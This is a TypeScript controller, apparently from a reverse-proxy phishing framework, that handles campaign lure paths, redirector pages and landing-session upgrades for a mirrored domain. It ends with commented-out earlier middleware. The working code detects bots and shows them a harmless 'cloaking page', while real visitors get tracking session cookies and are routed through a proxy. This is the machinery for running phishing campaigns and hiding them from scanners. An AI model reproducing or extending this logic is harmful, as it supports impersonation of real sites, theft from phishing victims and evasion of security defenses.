import { DIContainer, randomIdentSchema } from '@famir/common'
import {
  EnabledFullTargetModel,
  EnabledLureModel,
  FullCampaignModel,
  FullRedirectorModel,
  HTTP_SERVER_ROUTER,
  HttpRequestCookie,
  HttpServerContext,
  HttpServerError,
  HttpServerMiddleware,
  HttpServerNextFunction,
  HttpServerRouter,
  Logger,
  LOGGER,
  SessionModel,
  TEMPLATER,
  Templater,
  Validator,
  VALIDATOR
} from '@famir/domain'
import { BaseController } from '../base/index.js'
import { LandingRedirectorData, LandingUpgradeData } from './authorize.js'
import { type AuthorizeService, AUTHORIZE_SERVICE } from './authorize.service.js'

export const AUTHORIZE_CONTROLLER = Symbol('AuthorizeController')

export class AuthorizeController extends BaseController {
  static inject(container: DIContainer) {
    container.registerSingleton<AuthorizeController>(
      AUTHORIZE_CONTROLLER,
      (c) =>
        new AuthorizeController(
          c.resolve<Validator>(VALIDATOR),
          c.resolve<Logger>(LOGGER),
          c.resolve<Templater>(TEMPLATER),
          c.resolve<HttpServerRouter>(HTTP_SERVER_ROUTER),
          c.resolve<AuthorizeService>(AUTHORIZE_SERVICE)
        )
    )
  }

  static resolve(container: DIContainer): AuthorizeController {
    return container.resolve<AuthorizeController>(AUTHORIZE_CONTROLLER)
  }

  constructor(
    validator: Validator,
    logger: Logger,
    protected templater: Templater,
    router: HttpServerRouter,
    protected readonly authorizeService: AuthorizeService
  ) {
    super(validator, logger, router)

    this.validator.addSchemas({
      'session-cookie': randomIdentSchema
    })
  }

  addMiddlewares() {
    this.router.addMiddleware(this.authorizeMiddleware)
  }

  protected authorizeMiddleware: HttpServerMiddleware = async (ctx, next) => {
    try {
      const campaign = this.getState(ctx, 'campaign')
      const target = this.getState(ctx, 'target')

      if (target.isLanding) {
        if (ctx.isUrlPathEquals(campaign.landingUpgradePath)) {
          if (!ctx.isMethod('GET')) {
            await this.renderNotFoundPage(ctx, target)

            return
          }

          await this.landingUpgradeSession(ctx, campaign)

          return
        }

        const lure = await this.authorizeService.readLurePath({
          campaignId: campaign.campaignId,
          path: ctx.url.path
        })

        if (lure) {
          if (!ctx.isMethods(['HEAD', 'GET'])) {
            await this.renderNotFoundPage(ctx, target)
          }

          const redirector = await this.authorizeService.readRedirector({
            campaignId: campaign.campaignId,
            redirectorId: lure.redirectorId
          })

          await this.landingRedirectorSession(ctx, campaign, redirector, lure)

          return
        }

        await this.landingAuthSession(ctx, campaign, target, next)
      } else {
        await this.ordinarySession(ctx, campaign, target, next)
      }
    } catch (error) {
      this.handleException(error, 'authorize')
    }
  }

  private async landingUpgradeSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): Promise<void> {
    const landingUpgradeData = this.parseLandingUpgradeData(ctx, campaign)

    if (ctx.isBot()) {
      await this.renderMainRedirect(ctx)

      return
    }

    const sessionCookie = this.lookupSessionCookie(ctx, campaign)

    if (sessionCookie == null) {
      await this.renderMainRedirect(ctx)

      return
    }

    if (!this.testSessionCookie(sessionCookie)) {
      this.removeSessionCookie(ctx, campaign)

      await this.renderMainRedirect(ctx)

      return
    }

    const session = await this.authorizeService.authSession({
      campaignId: campaign.campaignId,
      sessionId: sessionCookie
    })

    if (!session) {
      this.removeSessionCookie(ctx, campaign)

      await this.renderMainRedirect(ctx)

      return
    }

    if (session.isLanding) {
      this.persistSessionCookie(ctx, campaign, session)

      await this.renderMainRedirect(ctx)

      return
    }

    await this.authorizeService.upgradeSession({
      campaignId: campaign.campaignId,
      lureId: landingUpgradeData.lureId,
      sessionId: session.sessionId,
      secret: landingUpgradeData.secret
    })

    this.persistSessionCookie(ctx, campaign, session)

    await this.renderMainRedirect(ctx)
  }

  private async landingRedirectorSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    redirector: FullRedirectorModel,
    lure: EnabledLureModel
  ): Promise<void> {
    const landingRedirectorData = this.parseLandingRedirectorData(ctx, campaign)

    if (ctx.isBot()) {
      await this.renderRedirectorPage(ctx, campaign, redirector, landingRedirectorData)

      return
    }

    const sessionCookie = this.lookupSessionCookie(ctx, campaign)

    if (sessionCookie == null) {
      const session = await this.authorizeService.createSession({
        campaignId: campaign.campaignId
      })

      this.persistSessionCookie(ctx, campaign, session)

      await this.renderOriginRedirect(ctx)

      return
    }

    if (!this.testSessionCookie(sessionCookie)) {
      this.removeSessionCookie(ctx, campaign)

      await this.renderOriginRedirect(ctx)

      return
    }

    const session = await this.authorizeService.authSession({
      campaignId: campaign.campaignId,
      sessionId: sessionCookie
    })

    if (!session) {
      this.removeSessionCookie(ctx, campaign)

      await this.renderOriginRedirect(ctx)

      return
    }

    await this.renderRedirectorPage(ctx, campaign, redirector, landingRedirectorData, session)
  }

  private async landingAuthSession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    next: HttpServerNextFunction
  ): Promise<void> {
    if (ctx.isBot()) {
      await this.renderCloakingPage(ctx, target)

      return
    }

    const sessionCookie = this.lookupSessionCookie(ctx, campaign)

    if (sessionCookie == null) {
      await this.renderCloakingPage(ctx, target)

      return
    }

    if (!this.testSessionCookie(sessionCookie)) {
      this.removeSessionCookie(ctx, campaign)

      await this.renderOriginRedirect(ctx)

      return
    }

    const session = await this.authorizeService.authSession({
      campaignId: campaign.campaignId,
      sessionId: sessionCookie
    })

    if (!session) {
      this.removeSessionCookie(ctx, campaign)

      await this.renderOriginRedirect(ctx)

      return
    }

    if (!session.isLanding) {
      await this.renderCloakingPage(ctx, target)

      return
    }

    const proxy = await this.authorizeService.readProxy({
      campaignId: campaign.campaignId,
      proxyId: session.proxyId
    })

    this.setState(ctx, 'proxy', proxy)
    this.setState(ctx, 'session', session)

    await next()
  }

  private async ordinarySession(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    target: EnabledFullTargetModel,
    next: HttpServerNextFunction
  ): Promise<void> {
    if (ctx.isBot()) {
      await this.renderCloakingPage(ctx, target)

      return
    }

    const sessionCookie = this.lookupSessionCookie(ctx, campaign)

    if (sessionCookie == null) {
      const session = await this.authorizeService.createSession({
        campaignId: campaign.campaignId
      })

      this.persistSessionCookie(ctx, campaign, session)

      await this.renderOriginRedirect(ctx)

      return
    }

    if (!this.testSessionCookie(sessionCookie)) {
      this.removeSessionCookie(ctx, campaign)

      await this.renderOriginRedirect(ctx)

      return
    }

    const session = await this.authorizeService.authSession({
      campaignId: campaign.campaignId,
      sessionId: sessionCookie
    })

    if (!session) {
      this.removeSessionCookie(ctx, campaign)

      await this.renderOriginRedirect(ctx)

      return
    }

    const proxy = await this.authorizeService.readProxy({
      campaignId: campaign.campaignId,
      proxyId: session.proxyId
    })

    this.setState(ctx, 'proxy', proxy)
    this.setState(ctx, 'session', session)

    await next()
  }

  private lookupSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): HttpRequestCookie | undefined {
    const requestCookies = ctx.getRequestCookies()

    return requestCookies[campaign.sessionCookieName]
  }

  private persistSessionCookie(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    session: SessionModel
  ) {
    const responseCookies = ctx.getResponseCookies()

    responseCookies[campaign.sessionCookieName] = {
      value: session.sessionId,
      domain: campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: Math.round(campaign.sessionExpire / 1000)
    }

    ctx.setResponseCookies(responseCookies)
  }

  private removeSessionCookie(ctx: HttpServerContext, campaign: FullCampaignModel) {
    const responseCookies = ctx.getResponseCookies()

    responseCookies[campaign.sessionCookieName] = {
      value: '',
      domain: campaign.mirrorDomain,
      path: '/',
      httpOnly: true,
      maxAge: 0
    }

    ctx.setResponseCookies(responseCookies)
  }

  private testSessionCookie(value: unknown): value is string {
    return this.validator.guardSchema<string>('session-cookie', value)
  }

  private parseLandingUpgradeData(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): LandingUpgradeData {
    try {
      const urlQuery = ctx.getUrlQuery()

      const value = urlQuery[campaign.landingUpgradeParam]

      if (!(value != null && typeof value === 'string')) {
        throw new Error(`Value is not a string`)
      }

      const data: unknown = JSON.parse(Buffer.from(value, 'base64').toString())

      this.validator.assertSchema<LandingUpgradeData>('landing-upgrade-data', data)

      return data
    } catch (error) {
      throw new HttpServerError(`Parse LandingUpgradeData failed`, {
        cause: error,
        code: 'BAD_REQUEST'
      })
    }
  }

  private parseLandingRedirectorData(
    ctx: HttpServerContext,
    campaign: FullCampaignModel
  ): LandingRedirectorData {
    try {
      const urlQuery = ctx.getUrlQuery()

      const value = urlQuery[campaign.landingRedirectorParam]

      if (!(value != null && typeof value === 'string')) {
        throw new Error(`Value is not a string`)
      }

      const data: unknown = JSON.parse(Buffer.from(value, 'base64').toString())

      this.validator.assertSchema<LandingRedirectorData>('landing-redirector-data', data)

      return data
    } catch (error) {
      throw new HttpServerError(`Parse LandingRedirectorData failed`, {
        cause: error,
        code: 'BAD_REQUEST'
      })
    }
  }

  private async renderCloakingPage(
    ctx: HttpServerContext,
    target: EnabledFullTargetModel
  ): Promise<void> {
    if (ctx.isUrlPathEquals('/')) {
      await this.renderMainPage(ctx, target)
    } else {
      await this.renderNotFoundPage(ctx, target)
    }
  }

  private async renderRedirectorPage(
    ctx: HttpServerContext,
    campaign: FullCampaignModel,
    redirector: FullRedirectorModel,
    landingRedirectorData: LandingRedirectorData,
    session?: SessionModel
  ): Promise<void> {
    const page = this.templater.render(redirector.page, landingRedirectorData)

    const body = Buffer.from(page)

    ctx.setResponseHeaders({
      'Content-Type': 'text/html',
      'Content-Length': body.length.toString(),
      'Last-Modified': redirector.updatedAt.toUTCString(),
      'Cache-Control': 'public, max-age=86400'
    })

    if (ctx.isMethod('GET')) {
      ctx.setResponseBody(body)
    }

    ctx.setStatus(200)

    await ctx.sendResponse()
  }
}

/*

  private landingUpgradeSessionHandler: HttpServerMiddleware = async (ctx, next) => {
    try {
      const { campaign, target } = this.getSetupMirrorState(ctx)

      const foundRoute = target.isLanding && ctx.isUrlPathEquals(campaign.landingAuthPath)

      if (!foundRoute) {
        await next()

        return
      }

      const isLandingAuthPath = ctx.isUrlPathEquals(campaign.landingAuthPath)

      if (isLandingAuthPath) {
        if (!ctx.isMethod('GET')) {
          await this.renderNotFoundPage(ctx, target)

          return
        }

        const urlQuery = ctx.getUrlQuery()

        if (!urlQuery) {
          await this.renderNotFoundPage(ctx, target)

          return
        }

        const landingAuthValue = urlQuery[campaign.landingAuthParam]
        const landingAuthData = this.parseLandingAuthData(ctx, landingAuthValue)

        if (!landingAuthData) {
          await this.renderNotFoundPage(ctx, target)

          return
        }

        const { session, proxy } = await this.authorizeService.upgradeSession({
          lureId: landingAuthData.lureId,
          sessionId: landingAuthData.sessionId,
          sessionSecret: landingAuthData.sessionSecret,
        })

        if (!session) {
          this.renderFailureRedirect(ctx, target)

          return
        }

        ctx.setResponseCookie(campaign.sessionCookieName, {
          value: session.sessionId,
          maxAge: Math.round(campaign.sessionExpire / 1000),
          httpOnly: true
        })
      }
    } catch (error) {
      this.handleException(error, 'landingUpgradeSession')
    }
  }


  private transparentAuthMiddleware: HttpServerMiddleware = async (ctx, next) => {
    try {
      this.existsStateCampaign(ctx.state)
      this.existsStateTarget(ctx.state)

      const { campaign, target } = ctx.state

      if (target.isLanding) {
        await next()

        return
      }

      const sessionCookie = ctx.requestCookies[campaign.sessionCookieName]

      if (!sessionCookie) {
        const { session } = await this.createSessionUseCase({
          campaignId: campaign.campaignId
        })

        ctx.responseCookies[campaign.sessionCookieName] = session.sessionId
        ctx.responseHeaders['location'] = ctx.url

        await ctx.sendResponse(301)

        return
      }

      const isOk = this.validateSessionCookie(sessionCookie)

      if (!isOk) {
        ctx.responseCookies[campaign.sessionCookieName] = null
        ctx.responseHeaders['location'] = ctx.url

        await ctx.sendResponse(301)

        return
      }

      const { session } = await this.authSessionUseCase({
        campaignId: campaign.campaignId,
        sessionCookie
      })

      if (!session) {
        ctx.responseCookies[campaign.sessionCookieName] = null
        ctx.responseHeaders['location'] = ctx.url

        await ctx.sendResponse(301)

        return
      }

      await next()
    } catch (error) {
      this.handleException(error, 'transparentAuth')
    }
  }

  private landingAuthMiddleware: HttpServerMiddleware = async (ctx, next) => {
    try {
      this.existsStateCampaign(ctx.state)
      this.existsStateTarget(ctx.state)

      const { campaign, target } = ctx.state

      if (!this.isLandingAuthRoute(ctx, campaign, target)) {
      }

      const isFound =
        ctx.isMethod('GET') &&
        ctx.isUrlPathEquals(campaign.landingAuthPath) &&
        target.isLanding

      if (!isFound) {
        await next()

        return
      }

      const urlQuery = ctx.getUrlQuery()

      const authParamsValue = urlQuery[campaign.landingAuthParam]
      const authParamsData = this.parseAuthParamsData(authParamsValue)

      if (!authParamsData) {
        this.renderNotFoundPage()

        return
      }

      const { session, proxy } = this.landingAuthUseCase.execute({
        campaignId: campaign.campaignId,
        lureId: authParamsData.lureId,
        sessionId: authParamsData.sessionId,
        sessionSecret: authParamsData.sessionSecret
      })

      if (!session) {
        this.renderFailureRedirect()

        return
      }

      ctx.setResponseCookie(campaign.sessionCookieName, session.sessionId)

      await next()
    } catch (error) {
      this.handleException(error, 'landingAuth')
    }
  }

  private isLandingAuthRoute(
    ctx: HttpServerContext,
    campaign: CampaignModel,
    target: EnabledTargetModel
  ): boolean {
    return ctx.isMethod('GET') && ctx.isUrlPathEquals(campaign.landingAuthPath) && target.isLanding
  }
*/
